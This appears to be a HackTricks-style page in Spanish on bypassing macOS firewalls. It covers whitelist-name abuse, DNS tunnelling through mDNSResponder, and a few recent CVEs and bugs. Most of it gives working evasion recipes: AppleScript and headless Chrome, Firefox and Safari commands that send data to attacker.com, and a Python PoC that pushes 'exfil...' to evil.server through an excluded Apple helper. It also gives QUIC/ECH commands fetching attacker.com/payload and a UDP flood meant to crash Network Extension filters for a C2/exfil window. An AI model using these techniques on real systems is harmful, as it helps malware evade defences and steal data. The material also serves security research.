# Bypassing Firewalls en macOS

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

Las siguientes técnicas funcionaban en algunas apps de firewall de macOS.

### Abusar de nombres de whitelist

- Por ejemplo, llamar al malware con nombres de procesos conocidos de macOS como **`launchd`**

### Synthetic Click

- Si el firewall solicita permiso al usuario, hacer que el malware haga clic en allow

### **Usar binarios firmados por Apple**

- Como **`curl`**, pero también otros como **`whois`**

### Dominios conocidos de Apple

El firewall podría permitir conexiones a dominios conocidos de Apple, como **`apple.com`** o **`icloud.com`**. Además, iCloud podría utilizarse como C2.

### Bypass genérico

Algunas ideas para intentar hacer bypass de firewalls

### Comprobar el tráfico permitido

Conocer el tráfico permitido ayudará a identificar dominios potencialmente incluidos en la whitelist o qué aplicaciones tienen permitido acceder a ellos
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abuso de DNS

En macOS, un proceso **no** se comunica directamente con el servidor DNS. La resolución de nombres se gestiona mediante **XPC** por **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), un daemon del sistema firmado por Apple, por lo que cada consulta realizada en el equipo sale del host como tráfico **de `mDNSResponder`**, en lugar de salir del proceso que la solicitó. Por tanto, los firewalls tienden a confiar incondicionalmente en ese daemon; bloquearlo interrumpiría la resolución de nombres de todo el sistema.<sup>[[1]](#references)</sup>

Esto convierte a DNS en un canal que permanece abierto incluso cuando el firewall bloquea los propios sockets del malware:<sup>[[1]](#references)</sup>

1. El malware intenta conectarse a `evil.com`. El firewall examina su **propia** conexión saliente y la **bloquea**.
2. En su lugar, el malware solicita a `mDNSResponder` que **resuelva** `evil.com` mediante XPC.
3. El firewall examina la consulta resultante, ve que el originador es el resolver de confianza firmado por Apple y la **permite**.
4. La consulta llega al servidor DNS y, si el atacante ejecuta el servidor autoritativo de `evil.com`, controla ambos extremos del intercambio.

Dado que el atacante posee esa zona, nunca es necesaria una "conexión": los datos se extraen ocultos dentro de las **etiquetas consultadas** (por ejemplo, `<encoded-chunk>.evil.com`) y los comandos regresan dentro de los **registros de respuesta** (TXT, A, CNAME...), lo que constituye un DNS tunnelling clásico sobre un proceso completamente incluido en la whitelist.

Cualquier proceso sin privilegios puede controlar directamente el daemon, lo que ofrece una forma sencilla de confirmar que el canal está abierto:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Mediante aplicaciones del navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Mediante inyecciones de procesos

Si puedes **inyectar código en un proceso** al que se le permite conectarse a cualquier servidor, podrías eludir las protecciones del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilidades recientes de bypass del firewall de macOS (2023-2025)

### Bypass del filtro de contenido web (Screen Time) – **CVE-2024-44206**
En julio de 2024, Apple corrigió un error crítico en Safari/WebKit que dejaba inservible el “filtro de contenido web” de todo el sistema utilizado por los controles parentales de Screen Time.
Una URI especialmente diseñada (por ejemplo, con un “://” codificado dos veces en URL) no es reconocida por la ACL de Screen Time, pero sí es aceptada por WebKit, por lo que la solicitud se envía sin filtrar. Por tanto, cualquier proceso que pueda abrir una URL (incluido código sandboxed o sin firmar) puede acceder a dominios bloqueados explícitamente por el usuario o por un perfil de MDM.<sup>[[2]](#references)</sup>

Prueba práctica (sistema sin parchear):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Error de ordenación de reglas de Packet Filter (PF) en las primeras versiones de macOS 14 “Sonoma”
Durante el ciclo beta de macOS 14, Apple introdujo una regresión en el wrapper de userspace de **`pfctl`**.
Las reglas añadidas con la palabra clave `quick` (utilizada por muchos kill-switches de VPN) se ignoraban silenciosamente, lo que provocaba leaks de tráfico incluso cuando una interfaz gráfica de VPN/firewall mostraba *blocked*. El error fue confirmado por varios proveedores de VPN y corregido en RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Comprobación rápida de leaks:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusando de servicios auxiliares firmados por Apple (legacy – pre-macOS 11.2)
Antes de macOS 11.2, **`ContentFilterExclusionList`** permitía que unos 50 binarios de Apple, como **`nsurlsessiond`** y la App Store, evadieran todos los firewalls de socket-filter implementados con el framework Network Extension (LuLu, Little Snitch, etc.).
El malware podía simplemente iniciar un proceso excluido —o inyectar código en él— y tunelizar su propio tráfico a través del socket que ya estaba permitido. Apple eliminó por completo la lista de exclusión en macOS 11.2, pero la técnica sigue siendo relevante en sistemas que no se pueden actualizar.<sup>[[3]](#references)</sup>

Ejemplo de proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH para evadir los filtros de dominio de Network Extension (macOS 12+)
Los Packet/Data Providers de NEFilter se basan en el SNI/ALPN del TLS ClientHello. Con **HTTP/3 sobre QUIC (UDP/443)** y **Encrypted Client Hello (ECH)**, el SNI permanece cifrado, NetExt no puede analizar el flujo y las reglas de hostname suelen fallar en modo fail-open, lo que permite que el malware llegue a dominios bloqueados sin interactuar con DNS.<sup>[[5]](#references)</sup>

PoC mínimo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Si QUIC/ECH sigue habilitado, esta es una ruta fácil para evadir el filtrado de hostname.

### Inestabilidad de Network Extension en macOS 15 “Sequoia” (2024–2025)
Las primeras compilaciones 15.0/15.1 bloquean los filtros de terceros de **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, etc.). Cuando el filtro se reinicia, macOS descarta sus reglas de flujo y muchos productos fallan en modo fail-open. Inundar el filtro con miles de flujos UDP cortos (o forzar QUIC/ECH) puede activar repetidamente el bloqueo y dejar una ventana para C2/exfil mientras la GUI sigue indicando que el firewall está en ejecución.<sup>[[4]](#references)</sup>

Reproducción rápida (entorno de laboratorio seguro):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Consejos de herramientas para macOS moderno

1. Inspecciona las reglas PF actuales que generan los firewalls con interfaz gráfica:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumera los binarios que ya tienen el entitlement *outgoing-network* (útil para aprovecharlos):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra mediante programación tu propio filtro de contenido de Network Extension en Objective-C/Swift.
En el código fuente de **LuLu**, de Patrick Wardle, hay disponible un PoC rootless mínimo que reenvía paquetes a un socket local.

## Referencias

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Creando y evadiendo firewalls de macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [El bypass del filtro de contenido web de Apple permite acceso sin restricciones al contenido bloqueado (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple elimina una función de macOS que permitía a las aplicaciones evadir la seguridad del firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Los productos de ciberseguridad dejan de funcionar tras la actualización a macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Usa la protección de red para ayudar a evitar las conexiones de macOS a sitios maliciosos - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [¡Corregido el error del firewall de macOS 14 Sonoma! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
